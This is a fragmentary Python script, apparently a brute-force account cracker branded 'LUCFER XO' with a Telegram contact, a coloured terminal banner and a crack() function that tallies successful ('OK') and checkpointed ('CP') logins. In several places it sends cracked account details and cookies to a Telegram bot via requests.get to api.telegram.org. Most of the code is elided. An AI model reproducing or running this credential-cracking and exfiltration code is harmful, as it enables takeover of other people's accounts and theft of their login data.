...
CON = sol()
os.system('clear')
cetak(nel('\t•  لاتنسى صور الصـيد : @krro6 •'))
...
\x1b[38;5;209m 
 ...
 \033[2;35m❆\033[1;33m═══════════════\033[2;32m[𓆩LUCFER XO𓆪]\033[1;33m════════════════\033[2;35m❆
 \033[1;33m┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[2;35m┓    
 \033[2;35m┃ \033[2;32mTelegram : \x1b[38;5;209m LUCFER XO | @krro6\033[2;35m┃
 \033[1;33m┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[2;35m┛ 
 ''')
...
def crack(idf,pwv):
	...
	fff = '%'
	print('\r%s [𓆩LUCFER XO𓆪] %s/%s » [OK] %s » [CP] %s » %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
...
▬ ∞ ▬ ∞ ▬ ∞ ▬ ∞ ▬ ∞ ▬ ∞ ▬ ∞ ▬ ∞
					...
					requests.get("https://api.telegram.org/bot"+str(tokenn1)+"/sendMessage?chat_id="+str(IID1)+"&text="+str(statuscp))
				break
...
▬ ∞ ▬ ∞ ▬ ∞ ▬ ∞ ▬ ∞ ▬ ∞ ▬ ∞ ▬ ∞
					...
					requests.get("https://api.telegram.org/bot"+str(tokenn1)+"/sendMessage?chat_id="+str(IID1)+"&text="+str(statusok))
					cek_VIP(kuki)
					break
...
▬ ∞ ▬ ∞ ▬ ∞ ▬ ∞ ▬ ∞ ▬ ∞ ▬ ∞ ▬ ∞
					...
					requests.get("https://api.telegram.org/bot"+str(tokenn1)+"/sendMessage?chat_id="+str(IID1)+"&text="+str(infoakun))
					hit1, hit2 = 0,0
